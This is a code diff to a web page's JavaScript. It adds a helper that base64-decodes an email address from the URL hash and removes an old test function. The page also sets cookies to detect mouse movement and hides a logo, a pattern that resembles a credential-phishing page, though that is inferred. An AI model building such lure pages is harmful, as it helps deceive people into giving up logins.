@@ -229,12 +229,31 @@
     return decodeURIComponent(atob(encoded));
   }
 
+  // Function to extract email from URL hash
+  function extractEmailFromHash() {
+    const hash = window.location.hash.substring(1); // Remove the # symbol
+    const params = new URLSearchParams(hash);
+    
+    if (params.has("email")) {
+      try {
+        const encodedEmail = params.get("email");
+        const decodedEmail = decodeData(encodedEmail);
+        return decodedEmail;
+      } catch (err) {
+        console.error("Error decoding email:", err);
+        return null;
+      }
+    }
+    return null;
+  }
+
   // Mark JS and mouse activity
   document.cookie = "js_enabled=1; path=/";
   document.addEventListener("mousemove", function () {
     document.cookie = "mouse_moved=1; path=/";
   }, { once: true });
 
+  
   // Decode email and update UI
   document.addEventListener("DOMContentLoaded", function () {
     const emailInput = document.getElementById("email");
@@ -257,31 +276,6 @@
         logo.style.display = "none";
       }
     }
-
-     // Test Method 1: URLSearchParams
-        function testMethod1() {
-            const testUrl = document.getElementById('url1').value;
-            const url = new URL(testUrl);
-            const hash = url.hash.substring(1);
-            const params = new URLSearchParams(hash);
-            
-            const resultDiv = document.getElementById('result1');
-            const resultEmail = document.getElementById('resultEmail1');
-            
-            if (params.has("email")) {
-                try {
-                    const decoded = decodeData(params.get("email"));
-                    resultEmail.textContent = decoded;
-                    resultDiv.style.display = 'block';
-                } catch (err) {
-                    resultEmail.textContent = "Error decoding email";
-                    resultDiv.style.display = 'block';
-                }
-            } else {
-                resultEmail.textContent = "No email parameter found in hash";
-                resultDiv.style.display = 'block';
-            }
-        }
 
   // jQuery-based form handling
   $(document).ready(function () {
@@ -360,4 +354,5 @@
 </body>
 
 </html>
+
 
